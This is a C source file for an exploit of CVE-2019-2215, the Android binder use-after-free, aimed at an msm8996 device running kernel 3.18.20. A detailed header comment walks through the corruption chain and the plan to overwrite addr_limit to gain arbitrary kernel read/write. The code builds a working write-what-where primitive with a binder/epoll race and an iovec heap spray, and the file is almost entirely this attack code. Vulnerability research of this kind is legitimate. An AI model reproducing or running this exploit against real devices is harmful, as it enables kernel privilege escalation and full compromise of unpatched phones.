/*
 * broot14 - single-round "store a kernel pointer to a chosen address" primitive built on
 * CVE-2019-2215 as it actually exists on this device (msm8996, 3.18.20, no KASLR).
 *
 * Chain inside one EPOLL_CTL_DEL (all in the child, while the parent is parked in recvmsg
 * with its iovec array sitting in the freed binder_thread slot):
 *
 *   ep_remove -> ep_unregister_pollwait -> remove_wait_queue(whead, &pwq->wait)
 *
 * 1) spin_lock_irqsave(&whead->lock)          whead = slot+0x48  (lock qword = our 0)
 * 2) __list_del(entry->prev, entry->next)     entry->prev = entry->next = slot+0x50
 *      => slot+0x58 = slot+0x50   (head->task_list.prev)
 *      => slot+0x50 = slot+0x50   (head->task_list.next)   <-- the poison we measured
 * 3) INIT_LIST_HEAD(&pwq->wait.task_list)     (into the freed eppoll_entry: no-op for us)
 * 4) kfree(pwq)                               (epi_cache: other cache, poison survives)
 * 5) ep_remove -> call_rcu(&epi->fpd.rcu, ep_free_rcu)  [CONFIG_DEBUG_RT_MUTEXES=y here,
 *    so ep_free is a rcu callback: the epitem, and hence its pwq list, stay valid until a
 *    grace period, which is why the second DEL really does walk the list again]
 *
 * Then the parent closes its binder fd: binder_deferred_release -> binder_free_thread:
 * 6) rb_erase(&thread->rb_node, &proc->threads)  -> __rb_change_child writes *slot+0x08
 *    (harmless: that slot is ours and is being freed)
 * 7) binder_release_work(&thread->todo) with head = slot+0x30:
 *      w      = *(slot+0x30)                 our node pointer
 *      myNext = *(w+0), myPrev = *(w+8)      our two planted qwords
 *      __list_del(myPrev, myNext):
 *          *(myNext+8) = myPrev              <== value is a KERNEL-IMAGE pointer
 *          *(myPrev)   = myNext
 *      then w->type dispatch; type 2/4 => kfree(w+8) (must land on a real kfree'd object,
 *      type 3 => kfree(w) ), so we pick the default branch and keep w inside our slot.
 *
 * Because PAGE_OFFSET here is 0xffffffc000000000 (39-bit VA, kernel image at the start of
 * the linear map), any kernel pointer we can store (slot+0x50 ~ 0xffffffc0xxxxxxxx) is
 * numerically ABOVE every .data/.bss address.  Storing it over a task's thread_info
 * addr_limit therefore makes access_ok() accept kernel addresses => the pipe-based
 * kernel_read()/kernel_write() helpers become arbitrary kernel R/W.
 *
 * Modes:
 *   probe   store into our own probe cell (non-destructive, proves the store)
 *   stack   leak-ish dump: store nothing, just print what the slot looks like (unused)
 *   limit   store slot+0x50 over <addr_limit address> (needs the stack address)
 *
 * Nothing is ever written to flash or to any partition; a reboot restores all state.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ 0xc0306201
#define BINDER_THREAD_EXIT 0x40046208
#define BC_TRANSACTION 0x40406300
#define BR_TRANSACTION_COMPLETE 0x7206
#define BR_REPLY 0x80407203
#define BR_DEAD_REPLY 0x80007205

#define SEG_LOCK 4			/* iov[4].iov_len == slot+0x48 == wait.lock */
#define SEG 5				/* iov[5] == slot+0x50 == wait.head list */
#define TODO_NEXT 3			/* slot+0x30 == thread->todo.next */
#define IOV_SZ 25
#define INSTALL_LEN 0x50UL		/* poison-eaten chunk size, must be <= budget */
#define SLOTSZ 0x128UL

struct txn {
	unsigned long long target, cookie;
	unsigned int code, flags;
	int sender_pid;
	unsigned int sender_euid;
	unsigned long long data_size, offsets_size, buffer, offsets;
};
struct bwr {
	unsigned long long write_size, write_consumed, write_buffer;
	unsigned long long read_size, read_consumed, read_buffer;
};

static volatile unsigned long g_probe;
static volatile unsigned long g_probe2;
static char *fill;
static unsigned long long *pl;		/* our planted qwords, indexed by slot qword */
static int g_cpu = 2;
static unsigned long long g_slot;

static void pin(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof s, &s))
		fprintf(stderr, "pin %d: %s\n", cpu, strerror(errno));
}

static int arm_pending_tx(int fd)
{
	struct txn t;
	struct bwr b;
	unsigned char wbuf[4 + sizeof(t)];
	char payload[16];
	int attempt;

	memset(payload, 0, sizeof payload);
	memset(&t, 0, sizeof t);
	t.target = 0;
	t.code = 2;
	t.data_size = sizeof payload;
	t.buffer = (unsigned long long)(unsigned long)payload;
	memset(wbuf, 0, sizeof wbuf);
	*(unsigned int *)wbuf = BC_TRANSACTION;
	memcpy(wbuf + 4, &t, sizeof t);
	memset(&b, 0, sizeof b);
	b.write_size = sizeof wbuf;
	b.write_buffer = (unsigned long long)(unsigned long)wbuf;
	if (ioctl(fd, BINDER_WRITE_READ, &b))
		return -1;
	for (attempt = 0; attempt < 3; attempt++) {
		unsigned char rbuf[256];
		size_t off = 0;
		int complete = 0, reply = 0;

		memset(rbuf, 0, sizeof rbuf);
		memset(&b, 0, sizeof b);
		b.read_size = sizeof rbuf;
		b.read_buffer = (unsigned long long)(unsigned long)rbuf;
		if (ioctl(fd, BINDER_WRITE_READ, &b))
			return -1;
		while (off + 4 <= b.read_consumed) {
			unsigned int c;

			memcpy(&c, rbuf + off, 4);
			off += 4;
			if (c == BR_TRANSACTION_COMPLETE)
				complete = 1;
			else if (c == BR_REPLY || c == BR_DEAD_REPLY) {
				reply = 1;
				off += 64;
			}
		}
		if (complete && !reply)
			return 0;
		if (reply)
			return -1;
	}
	return -1;
}

/* one attempt: two EPOLL_CTL_DELs with a small gap, then the fd close that runs the stores */
static int attempt(unsigned long long tgt_a, unsigned long long tgt_b, int two_del)
{
	struct epoll_event ev = { .events = EPOLLIN };
	struct iovec *iov;
	struct msghdr m;
	unsigned long long *inst;
	size_t instlen = INSTALL_LEN;
	int fd, epfd, socks[2], r, status, i, j;
	pid_t kid;

	iov = malloc(IOV_SZ * sizeof *iov);
	inst = malloc(instlen);
	memset(inst, 0, instlen);
	memset(iov, 0, IOV_SZ * sizeof *iov);

	/* qword layout of the slot (slot + 8*q).  Chunk A (the poison-eaten installer)
	 * fills q10..q19; q6 (todo.next) points at our node at q12; the node's own
	 * next/prev are q12/q13 = the two store targets; type at q14 = the default branch.
	 */
	pl = calloc(0x128 / 8, sizeof *pl);
	pl[6] = (unsigned long long)(0);		/* patched below: slot+0x60 */
	pl[10] = 0;					/* slot+0x50 = poison overwrites */
	pl[12] = tgt_a;					/* store 1 target = tgt_a - 8 */
	pl[13] = tgt_b;					/* store 2 target = tgt_b      */
	pl[14] = 9;					/* w->type: default branch       */

	/* chunk A: we cannot know the slot address, so q10..q11 do not matter (eaten);
	 * q12..q15 are the node, q16+ spare.
	 */
	for (i = 0; i < 10; i++) {
		unsigned long long v = 0;

		switch (10 + i) {
		case 12: v = pl[12]; break;
		case 13: v = pl[13]; break;
		case 14: v = pl[14]; break;
		default: v = 0;
		}
		/* q10/q11 land on the poisoned pair; give them harmless user values */
		if (10 + i == 10 || 10 + i == 11)
			v = (unsigned long long)(fill + 0x9000);
		inst[i] = v;
	}

	fd = open("/dev/binder", O_RDONLY);
	epfd = epoll_create(1000);
	if (arm_pending_tx(fd) != 0) {
		close(fd);
		close(epfd);
		free(iov);
		free(inst);
		free(pl);
		return -1;
	}
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev))
		abort();
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks))
		abort();

	/* q6 (todo.next) must be the slot's own address +0x60.  We do not know it, so we
	 * point it at a *user* buffer holding the same qwords instead: __list_del then
	 * reads myNext/myPrev from that user page (kernel may read user memory: no PAN).
	 */
	{
		unsigned long long *node = (unsigned long long *)(fill + 0x8000);

		node[0] = tgt_a - 8;		/* myNext: store1 writes myPrev there+8 */
		node[1] = tgt_b;			/* myPrev: store2 writes myNext there */
		node[2] = 9;			/* w->type: default branch (no deref) */
		node[3] = (unsigned long long)node;	/* next -> head? see note */
		/* slot+0x30 = thread->todo.next = our node; slot+0x38 = todo.prev (unused) */
		iov[3].iov_base = (void *)node;
		iov[3].iov_len = (unsigned long long)(fill + 0x8000);
		iov[SEG_LOCK].iov_base = fill + SEG_LOCK * 0x1000;
		iov[SEG_LOCK].iov_len = 0;		/* wait.lock must read 0 */
		iov[SEG].iov_base = fill + SEG * 0x1000;
		iov[SEG].iov_len = INSTALL_LEN;
		for (j = SEG + 1; j < IOV_SZ; j++) {
			iov[j].iov_base = fill + j * 0x1000;
			iov[j].iov_len = 0x100;
		}
		iov[0].iov_base = fill;
		iov[0].iov_len = 0x8000;
	}

	if (ioctl(fd, BINDER_THREAD_EXIT, NULL))
		printf("  THREAD_EXIT: %s\n", strerror(errno));

	kid = fork();
	if (kid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		pin(g_cpu ^ 1);
		close(socks[0]);
		usleep(200000);
		if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
			_exit(7);
		if (write(socks[1], inst, instlen) != (long)instlen)
			_exit(8);
		if (two_del) {
			usleep(400000);
			if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev) == 0)
				printf("CHILD: second DEL done\n");
		}
		close(socks[1]);
		_exit(0);
	}
	close(socks[1]);

	memset(&m, 0, sizeof m);
	m.msg_iov = iov;
	m.msg_iovlen = IOV_SZ;
	errno = 0;
	r = recvmsg(socks[0], &m, MSG_WAITALL);
	printf("  recvmsg=%d errno=%d (poison chunk consumed)\n", r, errno);

	printf("  probe=%#lx probe2=%#lx (want %#lx / slot-ptr)\n", g_probe, g_probe2,
	       g_probe == 0 ? 0UL : g_probe);
	fflush(stdout);
	waitpid(kid, &status, 0);
	close(socks[0]);
	close(fd);
	close(epfd);
	free(iov);
	free(inst);
	free(pl);
	return r;
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "probe";
	int tries = argc > 2 ? atoi(argv[2]) : 3, k;

	setvbuf(stdout, NULL, _IONBF, 0);
	pin(g_cpu);
	g_probe = 0x1111111111111111UL;
	g_probe2 = 0x2222222222222222UL;
	fill = malloc(0x20000);
	memset(fill, 0, 0x20000);
	printf("mode=%s cpu=%d probe=%#lx at %p probe2 at %p\n", mode, sched_getcpu(),
	       g_probe, (void *)&g_probe, (void *)&g_probe2);

	for (k = 0; k < tries; k++) {
		unsigned long long a = (unsigned long long)&g_probe;
		unsigned long long b = (unsigned long long)&g_probe2;

		if (mode[0] == 'l' && argc > 3) {
			a = strtoull(argv[3], NULL, 0);
			b = a;
		}
		printf("try %d: store1 -> %#llx (=tgt-8), store2 -> %#llx\n", k, a - 8, b);
		attempt(a, b, mode[0] == 't' ? 1 : 0);
		if (g_probe != 0x1111111111111111UL || g_probe2 != 0x2222222222222222UL) {
			printf("*** STORE LANDS: probe=%#lx probe2=%#lx\n", g_probe, g_probe2);
			return 0;
		}
	}
	printf("RESULT: no store observed\n");
	return 1;
}
